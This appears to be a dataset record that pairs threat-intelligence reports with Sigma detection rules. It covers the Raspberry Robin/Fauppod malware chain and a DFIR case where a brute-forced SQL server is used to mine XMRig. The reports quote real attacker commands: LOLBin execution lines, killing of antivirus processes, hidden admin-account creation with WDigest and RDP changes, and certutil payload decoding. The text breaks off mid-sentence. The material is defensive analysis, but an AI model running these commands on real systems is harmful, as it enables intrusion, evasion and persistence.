reached low-confidence assessment that the Fauppod malware samples were related to the later delivery of what was publicly known as Raspberry Robin and started investigating these links to raise confidence and discover more information.\n\nWhile authoring both file-based and behavior-based detections for Fauppod samples, Microsoft utilized existing detections based on the use of OBDCCONF as a LOLBin to launch _regsvr32_ (which was also detailed in Red Canary’s blog as a Raspberry Robin tactic, technique, and procedure (TTP)):\n\n```image\nAlt: Screenshot of commands using ODBCCONF as a proxy for regsvr execution\nDescription: The image contains a screenshot of command lines executed using the 'rundll32.exe' utility. It demonstrates the execution of a Shell command with parameters for loading a DLL file through 'ShellExec_RunDLL'. The command also incorporates a path to 'odbcconf' for registration, along with additional parameters indicating the installation of a driver. The presence of a specific DLL path and parameters suggests a technique used in malware execution, specifically related to the Raspberry Robin worm and its propagation method.\nTranscription: |\n  \"rundll32.exe\" SHELL32,ShellExec_RunDLL\n  \"C:\\WINDOWS\\syswow64\\odbccconf\" -s /c -A {regsvr\n  \"C:\\ProgramData\\Mzcvi\\adagmkc.lj.\"} /A {installdriver UBJWEBCPC CNKFAEJCRGH} /A {INSTALLTRANSLATOR}\n```\n\n_Figure 5. ODBCCONF being used as a proxy for regsvr execution, similar to Red Canary’s blog on Raspberry Robin_\n\nMicrosoft noted a unique quality in the command execution that was persistent through all Raspberry Robin infections stemming from an infected USB drive: there was a trailing “.” character at the end of the DLL name within the command above.\n\nWhile reviewing DEV-0651 Fauppod-delivered malware, Microsoft identified a Fauppod CPL sample served via GitHub when the following command is run:\n\n```image\nAlt: Screenshot of commands generated by DEV-0651's Fauppod CPL\nDescription: The image displays a screenshot of command-line instructions related to malware execution. The commands include the use of 'RUNDLL32.EXE' to execute 'shell32.dll' with 'ShellExec_RunDLL', and 'MSIEXEC.EXE' with various parameters. The paths reference system directories and a randomly named directory under 'ProgramData', indicating a method of executing malicious payloads, consistent with behaviors associated with the Raspberry Robin and Fauppod malware.\nTranscription: |\n  C:\\WINDOWS\\system32\\RUNDLL32.EXE shell32.dll,ShellExec_RunDLL\n  \"C:\\WINDOWS\\syswow64\\MSIEXEC.EXE\" -passive kwxqphxvuxcqb=JVHSVRNQYKIDCWK -promptrestart /z\n  \"C:\\ProgramData\\Jyfedj\\hfttnnm.ea.\" /PROMPTSTART\n```\n\n_Figure 6. DEV-0651 Fauppod CPL generated command line_\n\nNotable in the above Fauppod command are the following:\n\n- The use of _msiexec.exe_ to launch the Windows binary _shell32.dll_ as a LOLBin, instead of launching the malware PE directly via _rundll32.exe_, using _rundll32.exe_ to launch _shell32.dll_, and passing _ShellExec_RunDLL_ to load the commands—a TTP consistent with Raspberry Robin.\n- Fauppod CPL file’s use of a staging directory to copy a payload to disk using randomly generated directories in _ProgramData_ that then contain malicious PE files with randomly generated names and extensions. This naming pattern overlaps with those leveraged by publicly known Raspberry Robin DLLs.\n- The same trailing “.” in the DLL name as seen in the ODBCCONF proxying detailed in Red Canary’s blog. Avast also later noted this trailing in the DLL implant dropped by Raspberry Robin, which they refer to as Roshtyak.\n\nThese findings raised Microsoft’s confidence in assessing whether there is a connection between Fauppod’s CPL files and Raspberry Robin extending beyond a similarity in outer layers and packing of the malware.\n\nMicrosoft security researchers also identified a payload within a Fauppod sample communicating with a compromised QNAP storage server to send information about the infected device, overlapping with Raspberry Robin’s use of compromised QNAP appliances for C2.\n\nWhile continuing to monitor the prevalence and infection sources of Fauppod, Microsoft identified a heavily obfuscated .NET malware (SHA-256: a9d5ec72fad42a197cbadcb1edc6811e3a8dd8c674df473fd8fa952ba0a23c15) arriving on hosts that had previously been infected with either Raspberry Robin LNK infected hosts or Fauppod CPL malware.\n\n```image\nAlt: This screenshot shows the .NET DLL execution where the folder names are generated from combining two words from the dictionary.\nDescription: The image displays a command line execution screenshot showing the use of 'rundll32.EXE' to invoke a dynamically linked library (DLL) located in 'C:\\ProgramData\\GradeExperience\\'. The DLL file is named 'voicednws_St1_4' and suggests a complex directory structure with obfuscated names. This reflects a technique used in the propagation of malware, specifically related to the Raspberry Robin infection chain discussed in the provided context.\nTranscription: |\n  C:\\WINDOWS\\system32\\rundll32.EXE\n  C:\\ProgramData\\GradeExperience\\EergnitionPing\\uinsoht_Wvdenrl.dll,voicednws_St1_4\n```\n\n_Figure 7. .NET spreader DLL execution, via _rundll32_, with an export of _voicednws_St1_4_; the randomly generated directory structure of using two dictionary words is consistent across a significant number of infected hosts_\n\n```image\nAlt: This screenshot of the DNSpy app user interface shows the obfuscation of the .NET DLL file believed to be creating Raspberry Robin LNK files in USB drives.\nDescription: The image displays a screenshot from the DNSpy application, which is used for inspecting .NET assemblies. On the left side, the Assembly Explorer shows the structure of the 'unished_Wdwn.dll' file, including its base type definitions and various methods. On the right side, you can see the C# code of the assembly, highlighting method definitions and potential malware behavior. This screenshot is relevant as it demonstrates the obfuscation of a .NET DLL believed to be related to the Raspberry Robin malware, providing insights into its functionality and structure.\nTranscription: |\n  using System;\n  using System.Collections;\n  using System.Runtime.InteropServices;\n  using System.Text;\n  \n  namespace DOACIL_Help_IMB\n  {\n      public class hostxnt_wep1sig\n      {\n          // Token: 0x000000B8 RID: 184\n          private static void GlobalsInit()\n          {\n              if (hostxnt_wep1sig.aasds1_systemR0 != null && (uint)hostxnt_wep1sig.aasds1_systemR0.Length > 0)\n              {\n                  int num = (int)((IntPtr)hostxnt_wep1sig.MLManagementId.PolicyManagement_Cndlets[])[234]);\n                  uint system_outbuilder = hostxnt_wep1sig.System_outbuilder;\n                  if (num != 0)\n                  {\n                      if (num == 1)\n                      {\n                          int num2 = (int)((IntPtr)hostxnt_wep1sig.MLManagementId.PolicyManagement_Cndlets[])[89]);\n                          int num3 = (int)((IntPtr)hostxnt_wep1sig.MLManagementId.PolicyManagement_Cndlets[])[120]);\n                          double num4 = num3 + num2;\n                          hostxnt_wep1sig.G0sPa_Resourc1;\n                      }\n                      else\n                      {\n                          uint num5 = num1;\n                      }\n                  }\n              }\n          }\n      }\n  }\n```\n\n_Figure 8. DNSpy screenshot of a highly obfuscated .NET DLL assessed to be responsible for creating Raspberry Robin LNK files on external USB drives_\n\nWhile inspecting these samples, Microsoft noted that many were responsible for creating LNK files on external USB drives.\n\nBased on our investigation, Microsoft currently assesses with medium confidence that the above .NET DLLs delivered both by Raspberry Robin LNK infections and Fauppod CPL samples are responsible for spreading Raspberry Robin LNK files to USB drives. These LNK files, in turn, infect other hosts via the infection chain detailed in Red Canary’s blog.\n\nMicrosoft also assesses with medium confidence that the Fauppod-packed CPL samples are currently the earliest known point in the attack chain for propagating Raspberry Robin infections to targets. Microsoft findings suggest that the Fauppod CPL entities, the obfuscated .NET LNK spreader modules they drop, the Raspberry Robin LNK files Red Canary documented, and the Raspberry Robin DLL files (or, Roshtyak, as per Avast) could all be considered as various components to the “Raspberry Robin” malware infection chain.\n\n### The Fauppod-Dridex connection\n\nIn July 2022, Microsoft found Raspberry Robin infections that led to hands-on-keyboard activity by DEV-0243. One of the earliest malware campaigns to bring notoriety to DEV-0243 was the Dridex banking trojan.\n\nCode similarity between malware families is often used to demonstrate a link between families to a tracked actor. In IBM’s blog post published after we observed the Raspberry Robin and DEV-0243 connection, they highlighted several code similarities between the loader for the Raspberry Robin DLLs and the Dridex malware.\n\nMicrosoft’s analysis of Fauppod samples also identified some Dridex filename testing features, which are used to avoid running in certain environments. Fauppod has similar functionality to avoid execution if it recognizes it’s running as _testapp.exe_ or _self.exe_. This code similarity has historically caused some Fauppod samples to trip Dridex detection alerts.\n\n```image\nAlt: Screenshot of Fauppod code that shows commands related to its anti-investigation techniques.\nDescription: The image is a screenshot of code related to the Fauppod malware, highlighting commands that demonstrate its anti-investigation techniques. It specifically shows two segments of code that look for the presence of filenames \"self.exe\" and \"testapp.exe\" using API calls like `GetModuleHandleA` and `LoadLibraryW`. The highlighted sections illustrate how the malware avoids execution in certain environments, which is a technique linked to previous Dridex samples.\nTranscription: |\n  text:00401010\n  sub_401010 proc near              ; CODE XREF: DllEntryPoint:loc_401001\n  var_D          = byte ptr -0Ch\n  var_C          = dword ptr -8\n  var_8          = dword ptr -4\n  var_4          = dword ptr -0\n  push ebp\n  mov ebp, esp\n  sub esp, 14h\n  xor eax, eax\n  mov eax, ds:CloseHandle\n  cmp byte ptr [ecx], 08h\n  cmp [ebp+var_4], eax\n  jz short loc_401043\n  loc_401043:\n  mov eax, ds:GetCurrentThreadId\n  call eax\n  mov ecx, ds:OutputDebugStringA\n  cmp byte ptr [edx], 6Ah\n  cmp [ebp+var_8], eax\n  mov [ebp+var_4], ecx\n  jnz short loc_401078\n  loc_401048:\n  mov eax, esp\n  mov dword ptr [eax], offset aSelfExe ; \"self.exe\"\n  mov eax, ds:GetModuleHandleA\n  call eax\n  sub esp, 4\n  cmp eax, 0\n  mov [ebp+var_4], ecx\n  call sub_401070\n  loc_401070:\n  mov eax, esp\n  mov dword ptr [eax], offset aTestappExe ; \"testapp.exe\"\n  mov eax, ds:LoadLibraryW\n  call eax\n  sub esp, 4\n  cmp eax, 0\n  setz cl\n  mov eax, ecx\n  mov [ebp+var_4], cl\n  test cl, 1\n  jz short loc_401043\n  endp\n```\n\n_Figure 9. Screenshot highlighting _“self.exe”_ and _“testapp.exe”_ evasions in Fauppod using _GetModuleHandleA_ and _LoadLibraryW_ API calls, similar to previous Dridex samples_\n\nGiven the previously documented relationship between Raspberry Robin and DEV-0206/DEV-0243 (EvilCorp), this behavioral similarity in the initial vector for Raspberry Robin infections adds another piece of evidence to the connection between the development and propagation of Fauppod/Raspberry Robin and DEV-0206/DEV-0243.\n\n## Raspberry Robin’s future as part of the cybercriminal gig economy\n\nCybercriminal malware is an ever-present threat for most organizations today, taking advantage of common weaknesses in security strategies and using social engineering to trick users. Almost every organization risks encountering these threats, including Fauppod/Raspberry Robin and FakeUpdates. Developing a robust protection and detection strategy and investing in credential hygiene, least privileges, and network segmentation are keys to preventing the impact of these complex and highly connected cybercriminal threats.\n\nRaspberry Robin’s infection chain is a confusing and complicated map of multiple infection points that can lead to many different outcomes, even in scenarios where two hosts are infected simultaneously. There are numerous components involved; differentiating them could be challenging as the attackers behind the threat have gone to extreme lengths to protect the malware at each stage with complex loading mechanisms. These attackers also hand off to other actors for some of the more impactful attack stages, such as ransomware deployment.\n\nAs of this writing, Microsoft is aware of at least four confirmed Raspberry Robin entry vectors. These entry points were linked to hands-on-keyboard actions by attackers, and they all led to intrusions where the end goal was likely deployment of ransomware.\n\nInfections from Fauppod CPL files and the Raspberry Robin worm component have facilitated human-operated intrusions indicative of pre-ransomware activity. Based on the multiple infection stages and varied payloads, Microsoft assesses that DEV-0651’s initial access vector, the various spreading techniques of the malicious components, and high infection numbers have provided an attractive distribution option for follow-on payloads.\n\nBeginning on September 19, 2022, Microsoft identified Raspberry Robin worm infections deploying IcedID and—later at other victims—Bumblebee and TrueBot payloads. In October 2022, Microsoft researchers observed Raspberry Robin infections followed by Cobalt Strike activity from DEV-0950. This activity, which in some cases included a Truebot infection, eventually deployed the Clop ransomware.\n\n## Defending against Raspberry Robin infections\n\nWorms can be noisy and could lead to alert fatigue in security operations centers (SOCs). Such fatigue could lead to improper or untimely remediation, providing the worm operator ample opportunity to sell access to the affected network to other cybercriminals.\n\nWhile Raspberry Robin seemed to have no purpose when it was first discovered, it has evolved and is heading towards providing a potentially devastating impact on environments where it’s still installed. Raspberry Robin will likely continue to develop and lead to more malware distribution and cybercriminal activity group relationships as its install footprint grows.\n\nMicrosoft Defender for Endpoint and Microsoft Defender Antivirus detect Raspberry Robin and follow-on activities described in this blog. Defenders can also apply the following mitigations to reduce the impact of this threat:\n\n- Prevent drives from using autorun and execution code on insertion or mount. This can be done via registry settings or Group Policy.\n- Follow the defending against ransomware guidance in Microsoft’s RaaS blog post.\n- Enable tamper protection to prevent attacks from stopping or interfering with Microsoft Defender Antivirus.\n- Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants.\n\nMicrosoft customers can turn on attack surface reduction rules to prevent several of the infection vectors of this threat. Attack surface reduction rules, which any security administrator can configure, offer significant hardening against the worm. In observed attacks, Microsoft customers who had the following rules enabled were able to mitigate the attack in the initial stages and prevent hands-on-keyboard activity:\n\n- Block untrusted and unsigned processes that run from USB\n- Block execution of potentially obfuscated scripts\n- Block executable files from running unless they meet a prevalence, age, or trusted list criterion\n- Block credential stealing from the Windows local security authority subsystem (lsass.exe)\n\nDefenders can also refer to detection details and indicators or compromise in the following sections for more information about surfacing this threat.\n\n## Detection details\n\n### Microsoft Defender Antivirus\n\nMicrosoft Defender Antivirus detects threat components as the following malware:\n\n- Trojan:Win32/Fauppod\n\nConfigure Defender Antivirus scans to include removable drives. The following command lets admins scan removable drives, such as flash drives, during a full scan using the Set-MpPreference cmdlet:\n\n```\nSet-MpPreference -DisableRemovableDriveScanning\n```\n\nIf you specify a value of _$False_ or do not specify a value, Defender Antivirus scans removable drives during any type of scan. If you specify a value of _$True_, Defender Antivirus doesn’t scan removable drives during a full scan. Defender Antivirus can still scan removable drives during quick scans or custom scans.\n\nDefender Antivirus also detects identified post-compromise payloads as the following malware:\n\n- Behavior:Win32/Socgolsh.SB\n- Trojan:JS/Socgolsh.A\n- Trojan:JS/FakeUpdate.C\n- Trojan:JS/FakeUpdate.B\n- Trojan:Win32/IcedId\n- Backdoor:Win32/Truebot\n- TrojanDownloader:Win32/Truebot\n- Trojan:Win32/Truebot\n- Trojan:Win32/Bumblebee.E\n\n### Microsoft Defender for Endpoint\n\nAlerts with the following titles in the security center can indicate threat activity on your network:\n\n- Potential Raspberry Robin worm command\n- Possible Raspberry Robin worm activity\n\nMicrosoft also clusters indicators related to the presence of the Raspberry Robin worm under DEV-0856. The following alert can indicate threat activity on your network:\n\n- DEV-0856 activity group\n\nThe following alerts might also indicate threat activity associated with this threat. These alerts, however, can be triggered by unrelated threat activity and therefore are not monitored in the status cards provided with this report.\n\n- Suspicious process launched using cmd.exe\n- Suspicious behavior by msiexec.exe\n- Observed BumbleBee malware activity\n- Malware activity resembling Bumblebee loader detected\n- BumbleBeeLoader malware was prevented\n- Ransomware-linked emerging threat activity group detected\n- Ongoing hands-on-keyboard attacker activity detected (Cobalt Strike)\n- SocGholish command-and-control\n- Suspicious ‘Socgolsh’ behavior was blocked\n- DEV-0651 threat group activity associated with FakeUpdates JavaScript backdoor\n\n## Indicators of compromise (IOCs)\n\nNOTE: These indicators should not be considered exhaustive for this observed activity.\n\n**Fauppod samples delivered by DEV-0651 via legitimate cloud services**\n\n| Sample (SHA-256)                                                 | Related URL                                                                                                                                 | Related ad server    |\n| ---------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- | -------------------- |\n| d1224c08da923517d65c164932ef8d931633e5376f74bf0655b72d559cc32fd2 | hxxps://codeload[.]github[.]com/downloader2607/download64_12/zip/refs/heads/main                                                            | ads[.]softupdt[.]com |\n| 0b214297e87360b3b7f6d687bdd7802992bc0e89b170d53bf403e536e07e396e | hxxps://spideroak[.]com/storage/OVPXG4DJMRSXE33BNNPWC5LUN5PTSMRTGAZTG/shared/5392194-1-1040/Setup_64_1.zip?b6755c86e52ceecf8d806bf814690691 | 146[.]70[.]93[.]10   |\n| f18a54ba72df1a17daf21b519ffeee8463cfc81c194a8759a698709f1c9a3e87 | hxxps://dsfdsfgb[.]azureedge[.]net/332_332/universupdatepluginx84.zip                                                                       | Unknown              |\n| 0c435aadaa3c42a71ad8ff80781def4c8ce085f960d75f15b6fee8df78b2ac38 | hxxps://cdn[.]discordapp[.]com/attachments/1004390520904220838/1008127492449648762/Setup_64_11.zip                                          | Unknown              |\n\n**Timeline of Raspberry Robin deployments of various payloads**\n\n| Date    | Sample (SHA-256)                                                                                                                                                                                                     | Malware   | Notes                                                                                           |\n| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | ----------------------------------------------------------------------------------------------- |\n| 9/19/22 | 1789ba9965adc0c51752e81016aec5749<br>377ec86ec9a30449b52b1a5857424bf                                                                                                                                                 | IcedID    | Configuration details: { “Campaign ID”: 2094382323, “C2 url”: “aviadronazhed[.]com” }       |\n| 9/28/22 | 5c15151a29fab8a2d58fa55aa6c88a58a45<br>6b0a6bc959b843e9ceb2295c61885<br>09247f88d47b69e8d50f0fe4c10c7f0ecc95<br>c979a38c2f7dfee4aec3679b5807<br>f0115a8c173d30369acc86cb8c68d870c8c<br>f8a2b0b74d72f9dbba30d80f05614 | Bumblebee | Bumblebee called out to a Cobalt Strike Beacon server (guteyutur[.]com) shortly after execution |\n| 9/30/22 | 7e39dcd15307e7de862b9b42bf556f2836b<br>f7916faab0604a052c82c19e306ca                                                                                                                                                 | TrueBot   |                                                                                                 |",
    "sigma_rule": {
      "title": "Suspicious Msiexec Quiet Install From Remote Location",
      "id": "8150732a-0c9d-4a99-82b9-9efb9b90c40c",
      "related": [
        {
          "id": "f7b5f842-a6af-4da5-9e95-e32478f3cd2f",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of Msiexec.exe to install packages hosted remotely quietly",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-28",
      "modified": "2024-03-13",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\msiexec.exe"
          },
          {
            "OriginalFileName": "msiexec.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": [
            "-i",
            "-package",
            "-a",
            "-j"
          ]
        },
        "selection_quiet": {
          "CommandLine|contains|windash": "-q"
        },
        "selection_remote": {
          "CommandLine|contains": [
            "http",
            "\\\\\\\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_msiexec_install_remote.yml",
    "id": "263"
  },
  {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer\n\n**Categories:** coinminer, exploit \n**Published Date:** July 11, 2022 \n\n---\n\nIn March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting.\n\nUS CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link).\n\n---\n\n## Summary\n\nOver the month of March, we observed a cluster of activity targeting MSSQL servers. The activity started via password brute force attempts for the MSSQL SA account. These brute force attempts were observed repeatedly over the month. Examples included one cluster of 24,000 failed attempts from the same source, over a 27-hour effort, before they finally managed to guess the password. After obtaining the correct credentials, the attackers spawned a command shell via `xp_cmdshell`. According to Microsoft documentation, `xp_cmdshell` spawns a Windows command shell and passes in a string for execution.\n\nUsing `xp_cmdshell`, the threat actors were able to execute any command against the compromised server. They attempted to kill a bunch of AV programs by using `taskkill.exe`. The threat actors then wrote multiple commands to a batch file by using `echo` and redirecting the strings to a file named `1.bat`. After the batch file was written, they proceeded to perform the same action echoing data into a file named `bigfile.txt`. After finishing writing to that file, they ran `certutil` to decode the base64 data into an executable file. This executable was a privilege escalation tool used to execute the batch file to ensure it executed with high enough permissions. They then executed the batch script. The commands included adding new users to the local administrators group, enabling RDP, enabling WDigest, and hiding the newly created admin accounts using the registry.\n\nOnce the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner. They dropped a Binary Managed Object Format (BMOF) file along with the miner itself to achieve this. The threat actors used `mofcomp.exe` to decompile the BMOF binary and register a malicious class in the WMI repository. The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.\n\nNo other activity beyond the mining was observed before the threat actors were evicted.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, Sliver, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nArtifacts for this case are limited due to the environment. A few log sources are available for this case under our Security Researcher and Organization services.\n\n---\n\n## Initial Access\n\nThe initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.\n\nDuring the intrusions, we could see SQL Server event ID **18456** Failure Audit Events in the Windows application logs. We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.\n\n### Example of the failed brute force attempts:\n\n```image\nAlt: Failed Attempts\nDescription: The image displays a series of failed login attempts to a SQL Server, showing usernames and the corresponding reasons for failure. Each entry indicates whether the password did not match or the login could not be found. The usernames include common administrative names like 'sa' and 'admin,' highlighting potential brute force attack attempts.\nTranscription: |\n  sa | Reason: Password did not match that for the login provided. |\n  hbv7 | Reason: Could not find a login matching the name provided. |\n  su | Reason: Could not find a login matching the name provided. |\n  ps | Reason: Could not find a login matching the name provided. |\n  vice | Reason: Could not find a login matching the name provided. |\n  kisadmin | Reason: Could not find a login matching the name provided. |\n  401hk | Reason: Could not find a login matching the name provided. |\n  sysdba | Reason: Could not find a login matching the name provided. |\n  admin | Reason: Password did not match that for the login provided. |\n  uep | Reason: Could not find a login matching the name provided. |\n  bizbox | Reason: Could not find a login matching the name provided. |\n  neterp | Reason: Could not find a login matching the name provided. |\n  unierp | Reason: Could not find a login matching the name provided. |\n  sp | Reason: Could not find a login matching the name provided. |\n  root | Reason: Password did not match that for the login provided. |\n  bwsa | Reason: Could not find a login matching the name provided. |\n```\n\n### Followed by eventual successful logins:\n\n```image\nAlt: Successful Logins\nDescription: The image depicts a table displaying SQL Server audit events. It includes columns such as 'TimeWritten,' 'EventID,' 'EventTypeName,' 'EventCategory,' 'SourceName,' and 'Strings,' showing multiple entries for successful audit events. The entries indicate the timestamps of the events, the event type as 'Success Audit event,' and the source name as 'MSSQL$SQLEXPRESS,' suggesting automated access attempts by the threat actor.\nTranscription: |\n  | TimeWritten      | EventID | EventT | EventTypeName       | EventC | SourceName       | Strings       |\n  | ---------------- | ------- | ------ | ------------------- | ------ | ---------------- | ------------- |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:00 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n  | 2022-11-01 11:01 | 18454   | 8      | Success Audit event | 4      | MSSQL$SQLEXPRESS | sa | [CLIENT: |\n```\n\nIt is likely that multiple successful logins were observed due to the automated access script that the threat actor was using.\n\n---\n\n## Execution\n\nIn the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (`xp_cmdshell`). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.\n\n### Example of command execution following a successful authentication to SQL database using `xp_cmdshell`:\n\n```\nEXEC xp_cmdshell 'whoami'\n```\n\nAt a high level, the overall execution events can be depicted in the below diagram:\n\n```image\nAlt: Execution Diagram\nDescription: The image is a flow diagram illustrating the execution events following a successful brute-force attack against a SQL Server. It details the steps from authentication via brute force, the use of the command shell via `xp_cmdshell`, writing various scripts and files to disk, compiling a MOF file, and killing antivirus processes. The diagram includes visual elements like boxes and arrows showing the progression of actions taken by threat actors, such as adding local administrator accounts and setting up a scheduled task for running XMRig CoinMiner.\nTranscription: |\n  START\n    Brute-Force Attack Against SQL Server\n      Successful Authentication via Brute Force Attack\n        Command Shell via xp_cmdshell\n          Writes 1.bat, and bigfile.txt to disk\n            decodes bigfile.txt with certutil into bigfile.exe\n              bigfile.exe used to run 1.bat\n                1.bat performs the following\n                  Adding Local Administrator Accounts\n                  Hiding New Local Admin Accounts\n                  Enables RDP\n                  Enables Widget\n          Writes kit.bat to disk\n            Running XMRig CoinMiner\n              Creating scheduled task for CoinMiner\n      Compiling BMOF file\n        Adding a new class/ MyASEventConsumer in WMI repository\n          EventConsumer (Script or executable to run)\n            Creates persistence\n            Download/executes VBE script\n              - Random Name\n              - Executes every day at 23:00\n          EventFilter (Trigger condition)\n          Binding (Tie together Filter + Consumer)\n    Kills AV Processes\n```\n\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457 captures this as an `xp_cmdshell` event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using `taskkill` for various anti-virus software.\n\n### Commands to kill AV processes:\n\n```\ntaskkill /f /im egui.exe\ntaskkill /f /im QQPCTray.exe\ntaskkill /f /im SafeDogGuardCenter.exe\ntaskkill /f /im 360safe.exe\ntaskkill /f /im net1895.exe\ntaskkill /f /im ekrn.exe\ntaskkill /f /im 360rp.exe\ntaskkill /f /im QQPCMgr.exe\ntaskkill /f /im SafeDogServerUI.exe\ntaskkill /f /im SafeDogSiteIIS.exe\n```\n\nThe threat actors also favored the execution of batch scripts on the compromised host. They used `xp_cmdshell` to write a batch script (`1.bat`) to disk by redirecting strings to the file using `echo` commands.\n\n```image\nAlt: Batch Script Creation\nDescription: The image displays a table detailing a process execution log from a cybersecurity incident. It includes columns for 'Initiating Process File Name', 'Action Type', 'Initiating Process Command Line', 'Initiating Process Account Name', and 'File Name'. The table shows that 'cmd.exe' initiated a file creation action, specifically creating a batch file named '1.bat'. The command line executed involves various administrative commands, such as adding a user to local groups and modifying registry entries.\nTranscription: |\n  | Initiating Process File Name | Action Type | Initiating Process Command Line| Initiating Process Account Name | File Name |\n  | ---------------------------- | ----------- || ------------------------------- | --------- |\n  | cmd.exe                      | FileCreated | \"cmd.exe\" /c (echo NET USER Admin\\$ !67hC5140Rvg /ADD /expires:never & echo NET LOCALGROUP Administrators /ADD Admin\\$ & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SpecialAccounts\\Userlist /t REG_DWORD /d 0 & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f & echo reg add \"HKLM\\LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo NET LOCALGROUP Administrators /ADD Admin\\$ & echo NET LOCALGROUP Administrators /ADD Admin\\$ > %USERPROFILE%\\AppData\\1.bat | mssql$sqlexpress                | 1.bat     |\n```\n\nA second set of commands was also echoed into a file named `bigfile.txt`. Once complete, `certutil` was used to decode the text and create an executable file.\n\n### Certutil command:\n\n```\ncmd.exe /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe\n```\n\nThis executable was then used in executing the `1.bat` batch file.\n\n### Command to execute batch file:\n\n```\ncmd.exe /c %USERPROFILE%\\AppData\\bigfile.exe -i -c %USERPROFILE%\\AppData\\1.bat\n```\n\nPulling the hash of the file that was written matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: \nhttps://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n\n```image\nAlt: THOR Scanner\nDescription: The image displays a screenshot from the THOR APT Scanner, detailing YARA signature matches for various hacking tools and indicators. It includes specific rules like 'Hacktool_Inject_Incognito' and 'Hacktool_Privilege_Escalation_Jan22_1,' with links to their descriptions and detection information. Detection timestamps and AV detection rates (e.g., 8/67) are also provided, indicating the effectiveness of the rules in identifying malicious activity.\nTranscription: |\n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Inject_Incognito\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Inject_Incognito\n  DESCRIPTION: Detects hacktool incognito\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_inject_incognito\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Incognito_av\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Incognito_av\n  DESCRIPTION: Detects Hacktool Incognito Av\n  REFERENCE: https://www.virustotal.com/en/file/18e64d4c240f6481e7bd542f6c8acc802549d437ec0018e10a3b0b6f675d/analysis/\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 8 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_incognito_av\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTK_Inject_Privilege_Escalation_Jan22_1\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTK_Inject_Privilege_Escalation_Jan22_1\n  DESCRIPTION: Detects a hacktool that seems to provide privilege escalation vectors\n  RULE_AUTHOR: Florian Roth\n  \n  👋 Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the 